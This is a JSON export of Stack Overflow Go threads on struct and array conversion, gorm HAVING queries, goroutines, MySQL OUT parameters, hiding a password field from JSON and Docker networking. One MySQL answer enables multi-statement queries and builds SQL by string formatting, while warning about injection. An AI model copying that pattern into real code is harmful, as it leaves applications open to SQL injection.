acceptable to the end-users.</p>\n\n<p>In my experience working with 3d vectors, it's the <em>application of 3d transforms</em> on the vectors that's the real performance killer. Try running a profiler afterward to check which part of processing would produce the most bang for your development time.</p>\n\n<p>Hope this helps. Cheers,</p>\n"}, {"comments": [{"owner": {"reputation": 1320, "user_id": 593146, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/2404c3e4304714294c0458b3feb39ff0?s=128&d=identicon&r=PG", "display_name": "Zyl", "link": "https://stackoverflow.com/users/593146/zyl"}, "edited": false, "score": 0, "creation_date": 1540372350, "post_id": 52961569, "comment_id": 92836786, "body": "&gt; which <i>will</i> be inlined  --  That&#39;s what I like to read. :p"}, {"owner": {"reputation": 925, "user_id": 6717375, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kEXPd.jpg?s=128&g=1", "display_name": "jonathangersam", "link": "https://stackoverflow.com/users/6717375/jonathangersam"}, "edited": false, "score": 0, "creation_date": 1540423210, "post_id": 52961569, "comment_id": 92864828, "body": "Won&#39;t calls to <code>Vec3.Vector()</code> and <code>Vector.Vec3()</code> allocate new memory <i>every</i> call? They&#39;re being recreated with the type literal construction and then <code>return</code>ed by value each time, so &quot;copying&quot; is still in effect."}], "tags": [], "owner": {"reputation": 133115, "user_id": 221700, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad32856042eea9fd2db5210ac033787d?s=128&d=identicon&r=PG", "display_name": "peterSO", "link": "https://stackoverflow.com/users/221700/peterso"}, "is_accepted": true, "score": 3, "last_activity_date": 1540358557, "creation_date": 1540358557, "answer_id": 52961569, "question_id": 52959285, "link": "https://stackoverflow.com/questions/52959285/can-we-convert-between-arrays-and-structs-without-constructing-manually/52961569#52961569", "title": "Can we convert between arrays and structs without constructing &quot;manually&quot;?", "body": "<p>For a concise solution, which will be inlined, use methods.</p>\n\n<p>For example,</p>\n\n<pre><code>package main\n\nimport \"fmt\"\n\ntype Vec3 struct {\n    X, Y, Z float64\n}\n\nfunc (v Vec3) Vector() Vector {\n    return Vector{v.X, v.Y, v.Z}\n}\n\ntype Vector [3]float64\n\nfunc (v Vector) Vec3() Vec3 {\n    return Vec3{X: v[0], Y: v[1], Z: v[2]}\n}\n\nfunc main() {\n    v3 := Vec3{X: 1, Y: 2, Z: 3}\n    v3v := v3.Vector()\n    fmt.Println(v3, v3v)\n\n    v := Vector{4, 5, 6}\n    vv3 := v.Vec3()\n    fmt.Println(v, vv3)\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>{1 2 3} [1 2 3]\n[4 5 6] {4 5 6}\n</code></pre>\n"}], "owner": {"reputation": 1320, "user_id": 593146, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/2404c3e4304714294c0458b3feb39ff0?s=128&d=identicon&r=PG", "display_name": "Zyl", "link": "https://stackoverflow.com/users/593146/zyl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "accepted_answer_id": 52961569, "answer_count": 2, "score": 3, "last_activity_date": 1540372550, "creation_date": 1540338878, "last_edit_date": 1540372550, "question_id": 52959285, "link": "https://stackoverflow.com/questions/52959285/can-we-convert-between-arrays-and-structs-without-constructing-manually", "title": "Can we convert between arrays and structs without constructing &quot;manually&quot;?", "body": "<p>I have a struct to represent a vector in 3D space.</p>\n\n<pre><code>type Vec3 struct {\n    X, Y, Z float64\n}\n</code></pre>\n\n<p>Another library I am using does something similar, but different:</p>\n\n<pre><code>type Vector [3]float64\n</code></pre>\n\n<p>From my understanding, both types should occupy 24 bytes and each <code>float64</code> in one type should line up with a <code>float64</code> in the other type. So, we should be able to assign from one to the other without too much trouble. The compiler however does not like trying to cast these neither implicity nor explicitly, so the cleanest (but verbose) method appears to be to always construct the value manually:</p>\n\n<pre><code>// Vec3 to Vector\nvec3 := Vec3{1, 2, 3}\nvector := Vector{vec3.X, vec3.Y, vec3.Z}\n\n// Vector to Vec3\nvector := Vector{1, 2, 3}\nvec3 := Vec3{vector[0], vector[1], vector[2]}\n</code></pre>\n\n<p>Another method I found is the following, but it looks no less verbose (and probably slower (and it won't stop us if one of the types ever changes)).</p>\n\n<pre><code>valueOfTargetType := *(*targetType)(unsafe.Pointer(&amp;sourceValue))\n</code></pre>\n\n<p>So, can we cast these without explicitly constructing a new value?</p>\n"}, {"tags": ["go", "go-gorm"], "comments": [{"owner": {"reputation": 5548, "user_id": 4625526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6378aa788195a771461c5043057e2ed5?s=128&d=identicon&r=PG&f=1", "display_name": "Norbert van Nobelen", "link": "https://stackoverflow.com/users/4625526/norbert-van-nobelen"}, "edited": false, "score": 0, "creation_date": 1540352266, "post_id": 52958683, "comment_id": 92828268, "body": "Can you add some newlines in the queries? Reading them while scrolling is not really handy. Also what database dialect are you generating the queries for (they look like mysql, but you know best)"}, {"owner": {"reputation": 2586, "user_id": 3548468, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/U5OZO.png?s=128&g=1", "display_name": "kkesley", "link": "https://stackoverflow.com/users/3548468/kkesley"}, "reply_to_user": {"reputation": 5548, "user_id": 4625526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6378aa788195a771461c5043057e2ed5?s=128&d=identicon&r=PG&f=1", "display_name": "Norbert van Nobelen", "link": "https://stackoverflow.com/users/4625526/norbert-van-nobelen"}, "edited": false, "score": 0, "creation_date": 1540354696, "post_id": 52958683, "comment_id": 92828766, "body": "I updated my question. Is it better now? That&#39;s true, I&#39;m using mysql"}], "answers": [{"comments": [{"owner": {"reputation": 2586, "user_id": 3548468, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/U5OZO.png?s=128&g=1", "display_name": "kkesley", "link": "https://stackoverflow.com/users/3548468/kkesley"}, "edited": false, "score": 0, "creation_date": 1540357330, "post_id": 52961158, "comment_id": 92829444, "body": "yeah.. Finally I just construct raw sql query and append it at the end of the loop.. I hope gorm could support bracketing <code>or</code> and <code>and</code> in the future.. But for now I think you&#39;re right. Raw query it is."}], "tags": [], "owner": {"reputation": 5548, "user_id": 4625526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6378aa788195a771461c5043057e2ed5?s=128&d=identicon&r=PG&f=1", "display_name": "Norbert van Nobelen", "link": "https://stackoverflow.com/users/4625526/norbert-van-nobelen"}, "is_accepted": true, "score": 0, "last_activity_date": 1540355649, "creation_date": 1540355649, "answer_id": 52961158, "question_id": 52958683, "link": "https://stackoverflow.com/questions/52958683/gorm-having-query-with-or/52961158#52961158", "title": "gorm having query with OR", "body": "<p>The output of the line:</p>\n\n<pre><code>    groupQuery = groupQuery.Having(\"SUM(group_key = ? AND group_value = ?) &gt; 0\", key, val)\n</code></pre>\n\n<p>is the block</p>\n\n<pre><code>((SUM(group_key = 'age' AND group_value = '20') &gt; 0) \nAND \n(SUM(group_key = 'division' AND group_value = 'accounting') &gt; 0))\n\nAND \n\n((SUM(group_key = 'age' AND group_value = '22') &gt; 0) \nAND \n(SUM(group_key = 'division' AND group_value = 'kitchen') &gt; 0))\n</code></pre>\n\n<p>Which is correct. Look at all the opening and closing brackets per line:</p>\n\n<p>````(COND1) AND (COND2) AND (COND3) AND (COND4)```</p>\n\n<p>TO get a single or in the middle of the having statement as you request:</p>\n\n<pre><code>((SUM(group_key = 'age' AND group_value = '20') &gt; 0) \nAND \n(SUM(group_key = 'division' AND group_value = 'accounting') &gt; 0))\n\nAND \n\n((SUM(group_key = 'age' AND group_value = '22') &gt; 0) \nAND \n(SUM(group_key = 'division' AND group_value = 'kitchen') &gt; 0))\n</code></pre>\n\n<p>which would be:</p>\n\n<p><code>(COND1) AND (COND2) OR (COND3) AND COND(4)</code></p>\n\n<p>would lead to a less expected result.</p>\n\n<p>More logical would be to have:</p>\n\n<p><code>(COND1) OR (COND2) OR (COND3) OR COND(4)</code></p>\n\n<p>Or:</p>\n\n<p><code>((COND1) AND (COND2)) OR ((COND3) AND COND(4))</code></p>\n\n<p>This last version (which seems to be your target), can not be generated in a loop as stated, and would require a specific approach.</p>\n\n<p>It looks like you are pretty much relegated to just raw SQL for this.</p>\n"}], "owner": {"reputation": 2586, "user_id": 3548468, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/U5OZO.png?s=128&g=1", "display_name": "kkesley", "link": "https://stackoverflow.com/users/3548468/kkesley"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1627, "favorite_count": 0, "accepted_answer_id": 52961158, "answer_count": 1, "score": 0, "last_activity_date": 1540355649, "creation_date": 1540333848, "last_edit_date": 1540354659, "question_id": 52958683, "link": "https://stackoverflow.com/questions/52958683/gorm-having-query-with-or", "title": "gorm having query with OR", "body": "<p>I'm stuck in generating a query which is dynamically created in the run-time.</p>\n\n<p>I want to create a <code>having</code> query with <code>OR</code> in the middle so e.g.</p>\n\n<pre><code>SELECT name FROM `user_group`  WHERE ((group_key = 'age' AND group_value = '20')) \n\nOR ((group_key = 'division' AND group_value = 'accounting')) \nOR ((group_key = 'age' AND group_value = '22')) \nOR ((group_key = 'division' AND group_value = 'kitchen'))\n\nGROUP_BY name\nHAVING \n((SUM(group_key = 'age' AND group_value = '20') &gt; 0) \nAND \n(SUM(group_key = 'division' AND group_value = 'accounting') &gt; 0))\n\nOR \n\n((SUM(group_key = 'age' AND group_value = '22') &gt; 0) \nAND \n(SUM(group_key = 'division' AND group_value = 'kitchen') &gt; 0))\n</code></pre>\n\n<p>Note that the <code>OR</code> inside <code>having</code> statement is what I'm asking.</p>\n\n<p>I got this with gorm currently:</p>\n\n<pre><code>SELECT name FROM `user_group`  WHERE ((group_key = 'age' AND group_value = '20')) \n\nOR ((group_key = 'division' AND group_value = 'accounting')) \nOR ((group_key = 'age' AND group_value = '22')) \nOR ((group_key = 'division' AND group_value = 'kitchen'))\n\nGROUP_BY name\nHAVING \n((SUM(group_key = 'age' AND group_value = '20') &gt; 0) \nAND \n(SUM(group_key = 'division' AND group_value = 'accounting') &gt; 0))\n\nAND \n\n((SUM(group_key = 'age' AND group_value = '22') &gt; 0) \nAND \n(SUM(group_key = 'division' AND group_value = 'kitchen') &gt; 0))\n</code></pre>\n\n<p>Note the <code>AND</code> in the <code>having</code> statement</p>\n\n<p>This is the query generation:</p>\n\n<pre><code>for _, condition := range resp.Allow.Conditions {\n    for key, val := range condition {\n        if len(key) &lt;= 0 || len(val) &lt;= 0 {\n            continue\n        }\n        groupQuery = groupQuery.Or(\"(group_key = ? AND group_value = ?)\", key, val)\n        groupQuery = groupQuery.Having(\"SUM(group_key = ? AND group_value = ?) &gt; 0\", key, val)\n    }\n}\ngroupQuery = groupQuery.Group('name')\n</code></pre>\n\n<p>Is there any method to do this in <code>gorm</code>? I've looked at the documentation and my best bet that it has to be a raw sql query. I don't prefer it but if it's the only way than it's ok.</p>\n\n<p>NB: I'm using mysql as the dialect</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540325398, "post_id": 52956852, "comment_id": 92821707, "body": "This question doesn&#39;t really make any sense - goroutines are the only method of running code asynchronously in Go. Mutexes et al are methods of synchronizing goroutines. If you don&#39;t explicitly synchronize them, they run asynchronously, and there is no such thing as &quot;await&quot; in Go."}, {"owner": {"reputation": 44495, "user_id": 3058609, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/2c0357556707713572abbf637a907ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Adam Smith", "link": "https://stackoverflow.com/users/3058609/adam-smith"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540343723, "post_id": 52956852, "comment_id": 92826665, "body": "@Adrian but &quot;How to do something asynchronously without awaiting in golang&quot; makes sense, and in context &quot;I know go has goroutines, mutex, and many other goodies&quot; is easily understandable as &quot;I know Go has a bunch of concurrency stuff, but I don&#39;t know enough about it to solve this problem.&quot;"}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540381297, "post_id": 52956852, "comment_id": 92842363, "body": "But go does not have &quot;a bunch of concurrency stuff&quot;. It has goroutines, full stop. All the rest is for synchronization, ie reducing concurrency."}, {"owner": {"reputation": 18578, "user_id": 4031815, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/a945fa2f0e9ecbcf3f670e0865fa7169?s=128&d=identicon&r=PG&f=1", "display_name": "CommonSenseCode", "link": "https://stackoverflow.com/users/4031815/commonsensecode"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540385438, "post_id": 52956852, "comment_id": 92845132, "body": "@Adrian SO is for helping and leaving easy to find (google) Q&amp;A, references for future developers, including ourselves in the future. If you have no positive contribution I would suggest to just get over it and carry on."}], "answers": [{"comments": [{"owner": {"reputation": 44495, "user_id": 3058609, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/2c0357556707713572abbf637a907ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Adam Smith", "link": "https://stackoverflow.com/users/3058609/adam-smith"}, "reply_to_user": {"reputation": 41009, "user_id": 450989, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YGjdr.jpg?s=128&g=1", "display_name": "Grzegorz \u017bur", "link": "https://stackoverflow.com/users/450989/grzegorz-%c5%bbur"}, "edited": false, "score": 0, "creation_date": 1540325225, "post_id": 52956983, "comment_id": 92821622, "body": "@Grzegorz\u017bur true -- fixed."}, {"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 0, "creation_date": 1540328665, "post_id": 52956983, "comment_id": 92823036, "body": "Might want to use WaitGroup in case the code exits before the update is done"}], "tags": [], "owner": {"reputation": 44495, "user_id": 3058609, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/2c0357556707713572abbf637a907ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Adam Smith", "link": "https://stackoverflow.com/users/3058609/adam-smith"}, "is_accepted": true, "score": 6, "last_activity_date": 1540325219, "last_edit_date": 1540325219, "creation_date": 1540324833, "answer_id": 52956983, "question_id": 52956852, "link": "https://stackoverflow.com/questions/52956852/golang-do-an-async-task-without-awaiting/52956983#52956983", "title": "Golang do an async task without awaiting", "body": "<p>just start the async task with the <code>go</code> keyword. It'll spin off in its own goroutine and your main line of execution doesn't have to care about it anymore.</p>\n\n<pre><code>product := fetchProduct()\nif product.isExpired() {\n        go product.updateStatus(\"expired\")\n}\n// return as normal\n</code></pre>\n\n<p>Note that since <code>product.updateStatus</code> is almost certainly changing the state of that product, it's difficult to predict when it's safe to use that product again (aka when it's been updated in the underlying database layer)</p>\n"}], "owner": {"reputation": 18578, "user_id": 4031815, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/a945fa2f0e9ecbcf3f670e0865fa7169?s=128&d=identicon&r=PG&f=1", "display_name": "CommonSenseCode", "link": "https://stackoverflow.com/users/4031815/commonsensecode"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 897, "favorite_count": 1, "accepted_answer_id": 52956983, "answer_count": 1, "score": 0, "last_activity_date": 1540358117, "creation_date": 1540324298, "last_edit_date": 1540358117, "question_id": 52956852, "link": "https://stackoverflow.com/questions/52956852/golang-do-an-async-task-without-awaiting", "title": "Golang do an async task without awaiting", "body": "<p>Some pseudocode describing my problem:</p>\n\n<ol>\n<li>Fetch a product from database a <code>FoodProduct</code></li>\n<li>check if isExpired() <code>FoodProduct.DueDate.Before(time.Now())</code></li>\n<li><p><code>if isExpired()</code> then start <strong>async</strong> task to update the status of the FoodProduct in database as expired: <code>FoodProduct.updateStatus(\"expired\")</code></p>\n\n<p>[<code>if isExpired()=false</code> just skip to step 4.]</p></li>\n<li>return <code>FoodProduct</code> to client via http without awaiting for answer from step 3</li>\n</ol>\n\n<p>I know go has goroutines, mutex and many other goodies. If I don't care about the result of async operation what option should I use?</p>\n"}, {"tags": ["mysql", "go"], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 10548292, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-D4NyqgjN9-s/AAAAAAAAAAI/AAAAAAAAAAA/ABtNlbAZcEI2A4__xuJY_cZ_LBMUctNtpQ/mo/photo.jpg?sz=128", "display_name": "grav80 grav80", "link": "https://stackoverflow.com/users/10548292/grav80-grav80"}, "edited": false, "score": 0, "creation_date": 1540410175, "post_id": 52960665, "comment_id": 92860120, "body": "Thank you so much! I have the time to play around, is there any other driver I can mess around with to practice the out variable function?"}, {"owner": {"reputation": 3, "user_id": 10548292, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-D4NyqgjN9-s/AAAAAAAAAAI/AAAAAAAAAAA/ABtNlbAZcEI2A4__xuJY_cZ_LBMUctNtpQ/mo/photo.jpg?sz=128", "display_name": "grav80 grav80", "link": "https://stackoverflow.com/users/10548292/grav80-grav80"}, "edited": false, "score": 0, "creation_date": 1540575504, "post_id": 52960665, "comment_id": 92930931, "body": "I actually thought about this some more. Instead of relying on the out variable, I&#39;ve broken the stored procedures down into smaller chunks. Micro procedures with no out variables. I&#39;ll let Go check for errors. Would that be a better way of protecting against injection?"}, {"owner": {"reputation": 39969, "user_id": 1385845, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c8c83a83d31eb49749a3ed04ecdf41c7?s=128&d=identicon&r=PG", "display_name": "Chad Grant", "link": "https://stackoverflow.com/users/1385845/chad-grant"}, "edited": false, "score": 0, "creation_date": 1577000287, "post_id": 52960665, "comment_id": 105068168, "body": "if using placeholders (?,?,?) you&#39;ll also need interpolateParams=true"}], "tags": [], "owner": {"reputation": 84923, "user_id": 1920232, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iUA8y.jpg?s=128&g=1", "display_name": "peterm", "link": "https://stackoverflow.com/users/1920232/peterm"}, "is_accepted": true, "score": 1, "last_activity_date": 1540351604, "creation_date": 1540351604, "answer_id": 52960665, "question_id": 52956747, "link": "https://stackoverflow.com/questions/52956747/executing-different-mysql-query-using-golang/52960665#52960665", "title": "Executing different MySQL query using Golang", "body": "<p>Unfortunately MySQL driver, at least <code>go-sql-driver/mysql</code>, doesn't support <code>Out</code> parameters. But you can still use MySQL session variable to retrieve the value of the out parameter.</p>\n\n<p>You'll need to enable multi-statement support for this to work though</p>\n\n<pre class=\"lang-golang prettyprint-override\"><code>dsn := fmt.Sprintf(\n    \"%s:%s@%s/%s?charset=utf8&amp;multiStatements=true\", // &lt;-- add this\n    DB_USER, DB_PASS, DB_HOST, DB_NAME,\n)\n</code></pre>\n\n<p>and then</p>\n\n<pre class=\"lang-golang prettyprint-override\"><code>// initialize @out to ensure we're not getting a previous value\nq := \"SET @out=NULL\"\n// execute our SP\nq += fmt.Sprintf(\n    \";CALL regWorker('%s', '%s', '%s', '%s', '%s', @out)\",\n    \"Thuto\", \"Deere4454de\", \"fueqx@mdj4f.com\", \"8725554675364\", \"94874256443\",\n)\n// return the resultset containing the value of the out parameter\nq += \";SELECT COALESCE(@out, 0)\"\n\nvar out int\ndb.QueryRow(q).Scan(&amp;out)\n</code></pre>\n\n<p><em>In this example I assumed that the <code>out</code> parameter is of type <code>int</code>. Adjust appropriately to your requirements.</em></p>\n\n<p>Note: that unfortunately you're not going to be able to use a prepared statement in this case; therefore you'll need to take care of proper sanitizing and escaping of parameter values to prevent sql injections.</p>\n"}], "owner": {"reputation": 3, "user_id": 10548292, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-D4NyqgjN9-s/AAAAAAAAAAI/AAAAAAAAAAA/ABtNlbAZcEI2A4__xuJY_cZ_LBMUctNtpQ/mo/photo.jpg?sz=128", "display_name": "grav80 grav80", "link": "https://stackoverflow.com/users/10548292/grav80-grav80"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 374, "favorite_count": 0, "accepted_answer_id": 52960665, "answer_count": 1, "score": 0, "last_activity_date": 1540351604, "creation_date": 1540323868, "last_edit_date": 1540324211, "question_id": 52956747, "link": "https://stackoverflow.com/questions/52956747/executing-different-mysql-query-using-golang", "title": "Executing different MySQL query using Golang", "body": "<p>I'm using Go 1.9 and see that nowhere does it prescribe me to use the following syntax</p>\n\n<pre><code>func main() {\ndsn := DB_USER + \":\" + DB_PASS + \"@\" + DB_HOST + \"/\" + DB_NAME + \"?charset=utf8\"\ndb, err := sql.Open(\"mysql\", dsn)\nif err != nil {\n    log.Fatal(err)\n}\ndefer db.Close()\n\nq := \"call regWorker('Thuto', 'Deere4454de', 'fueqx@mdj4f.com', '8725554675364', '94874256443', @outarg)\"\n\n_, err = db.Exec(q)\nif err != nil {\n    log.Fatal(err)\n}'\n</code></pre>\n\n<p>What I found odd is that it actually registers the worker? My problem is that I need the @outarg value and I'm not 100% sure how to retrieve it. I'd like to rewrite this code to be in line with the go-sql as explained here <a href=\"https://golang.org/pkg/database/sql/#Out\" rel=\"nofollow noreferrer\">https://golang.org/pkg/database/sql/#Out</a></p>\n\n<p>I tried searching and I humbly apologise if this has been explained before.</p>\n\n<p>edit: I'm very new to go</p>\n"}, {"tags": ["go"], "answers": [{"comments": [{"owner": {"reputation": 1057, "user_id": 9993548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/665efa711b885fb0bfda346fbe51c95c?s=128&d=identicon&r=PG", "display_name": "Nir Berko", "link": "https://stackoverflow.com/users/9993548/nir-berko"}, "edited": false, "score": 0, "creation_date": 1540324085, "post_id": 52956729, "comment_id": 92821097, "body": "The problem with getters that I need to call all the getters I want to send the client, and I want to make my life easier just making a UI struct with the data I want to make public. I will check about your first suggestion, sounds right"}], "tags": [], "owner": {"reputation": 1255, "user_id": 4982148, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/X52Wq.jpg?s=128&g=1", "display_name": "atakanyenel", "link": "https://stackoverflow.com/users/4982148/atakanyenel"}, "is_accepted": false, "score": 2, "last_activity_date": 1540323819, "creation_date": 1540323819, "answer_id": 52956729, "question_id": 52956655, "link": "https://stackoverflow.com/questions/52956655/convert-hide-values-from-struct/52956729#52956729", "title": "Convert / Hide values from struct", "body": "<p>I have seen some examples doing what you described. A different struct with just desired data and a transform function between both structs. Depending on your application , it is also possible to make fields private or public. For example, Json or Yaml parser of golang only fills public fields of a struct. </p>\n\n<p>If you are coming from a more OOP background, you can always write Getter-Setter methods to your struct.</p>\n\n<p>Easiest method seems to be the one you wrote in your question.</p>\n"}, {"comments": [{"owner": {"reputation": 1057, "user_id": 9993548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/665efa711b885fb0bfda346fbe51c95c?s=128&d=identicon&r=PG", "display_name": "Nir Berko", "link": "https://stackoverflow.com/users/9993548/nir-berko"}, "edited": false, "score": 0, "creation_date": 1540326355, "post_id": 52957307, "comment_id": 92822164, "body": "as also @atayenel recommended me, this is exactly what I wanted, and it works like a magic"}], "tags": [], "owner": {"reputation": 193, "user_id": 9957458, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YonLx.jpg?s=128&g=1", "display_name": "Radu Ciurlea", "link": "https://stackoverflow.com/users/9957458/radu-ciurlea"}, "is_accepted": true, "score": 5, "last_activity_date": 1540327418, "last_edit_date": 1540327418, "creation_date": 1540326126, "answer_id": 52957307, "question_id": 52956655, "link": "https://stackoverflow.com/questions/52956655/convert-hide-values-from-struct/52957307#52957307", "title": "Convert / Hide values from struct", "body": "<p>Having view structs is probably a good idea in general, as you don't want to couple the API format to internal representation. Regardless, if you just wanna do this the lazy way and avoid serializing the password, you can always use the <code>-</code> json struct tag:</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"encoding/json\"\n    \"log\"\n)\n\ntype user struct {\n    ID      int     `json:\"id\"`\n    Name    string  `json:\"name\"`\n    Pass    string  `json:\"-\"`\n}\n\nfunc main() {\n    u := &amp;user{123, \"John\", \"supersecret\"}\n    b, err := json.Marshal(u)\n    if err != nil {\n        log.Fatal(err)\n    }\n    fmt.Println(string(b))\n}\n</code></pre>\n\n<p><a href=\"https://play.golang.org/p/yewtt1lyvzu\" rel=\"nofollow noreferrer\">Playground</a></p>\n"}], "owner": {"reputation": 1057, "user_id": 9993548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/665efa711b885fb0bfda346fbe51c95c?s=128&d=identicon&r=PG", "display_name": "Nir Berko", "link": "https://stackoverflow.com/users/9993548/nir-berko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "accepted_answer_id": 52957307, "answer_count": 2, "score": 0, "last_activity_date": 1540327418, "creation_date": 1540323494, "question_id": 52956655, "link": "https://stackoverflow.com/questions/52956655/convert-hide-values-from-struct", "title": "Convert / Hide values from struct", "body": "<p>I have an application that creates a user at the database and returns his information (with struct). and I want to send the user model to the client (response of the web server), without password (or more information that I don't want the client will get).\nwhat the right way to do that? make a \"UIUser\" struct with the only fields that I want to send the client and convert the original model to this struct? or user interface?</p>\n\n<p>and of course, if you can give me an example to solve this problem.</p>\n"}, {"tags": ["docker", "go", "dockerfile", "ubuntu-18.04"], "comments": [{"owner": {"reputation": 133, "user_id": 4673732, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n2kSl.jpg?s=128&g=1", "display_name": "Riverside", "link": "https://stackoverflow.com/users/4673732/riverside"}, "edited": false, "score": 0, "creation_date": 1540375393, "post_id": 52956291, "comment_id": 92838737, "body": "It looks like a DNS issue, have you tried using IPs ? (Exemple : 8.8.8.8)"}, {"owner": {"reputation": 43, "user_id": 6088841, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-pKBMYc2VCNI/AAAAAAAAAAI/AAAAAAAAAKA/5xPhBCZ3RYE/photo.jpg?sz=128", "display_name": "Shakhawat Hossain", "link": "https://stackoverflow.com/users/6088841/shakhawat-hossain"}, "reply_to_user": {"reputation": 133, "user_id": 4673732, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n2kSl.jpg?s=128&g=1", "display_name": "Riverside", "link": "https://stackoverflow.com/users/4673732/riverside"}, "edited": false, "score": 0, "creation_date": 1540706727, "post_id": 52956291, "comment_id": 92958677, "body": "How to do that exactly? could you please describe? Thanks"}, {"owner": {"reputation": 133, "user_id": 4673732, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n2kSl.jpg?s=128&g=1", "display_name": "Riverside", "link": "https://stackoverflow.com/users/4673732/riverside"}, "edited": false, "score": 0, "creation_date": 1540803675, "post_id": 52956291, "comment_id": 92983064, "body": "You should replace <code>google.com</code> by <code>8.8.8.8</code>, like so <code>ping 8.8.8.8</code>"}], "answers": [{"tags": [], "owner": {"reputation": 43, "user_id": 6088841, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-pKBMYc2VCNI/AAAAAAAAAAI/AAAAAAAAAKA/5xPhBCZ3RYE/photo.jpg?sz=128", "display_name": "Shakhawat Hossain", "link": "https://stackoverflow.com/users/6088841/shakhawat-hossain"}, "is_accepted": false, "score": 1, "last_activity_date": 1562891713, "creation_date": 1562891713, "answer_id": 56998885, "question_id": 52956291, "link": "https://stackoverflow.com/questions/52956291/after-upgrade-from-ubuntu-18-04-to-18-10-no-internet-connection-inside-docker-co/56998885#56998885", "title": "After upgrade from ubuntu 18.04 to 18.10 no internet connection inside docker container", "body": "<p>I got the solution that may be helpful for someone else.</p>\n\n<p>Accessing running container through /bin/bash</p>\n\n<pre><code>docker run --network=host -it whoshakhawat/go-app /bin/bash\n</code></pre>\n\n<p>The --network=host takes out any network isolation between the docker host and the docker containers.</p>\n\n<p>Now ping command inside the docker container is working fine.</p>\n\n<pre><code>root@62ba0502a1c6:/# ping github.com\nPING github.com (192.30.255.112) 56(84) bytes of data.\n64 bytes from lb-192-30-255-112-sea.github.com (192.30.255.112): icmp_seq=1 ttl=47 time=259 ms\n</code></pre>\n\n<p>Here Docker container and Host machine both are aligned in the same network.\nRead Documentation here <a href=\"https://docs.docker.com/network/host/\" rel=\"nofollow noreferrer\">https://docs.docker.com/network/host/</a></p>\n"}], "owner": {"reputation": 43, "user_id": 6088841, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-pKBMYc2VCNI/AAAAAAAAAAI/AAAAAAAAAKA/5xPhBCZ3RYE/photo.jpg?sz=128", "display_name": "Shakhawat Hossain", "link": "https://stackoverflow.com/users/6088841/shakhawat-hossain"}, "delete_vote_count": 0, 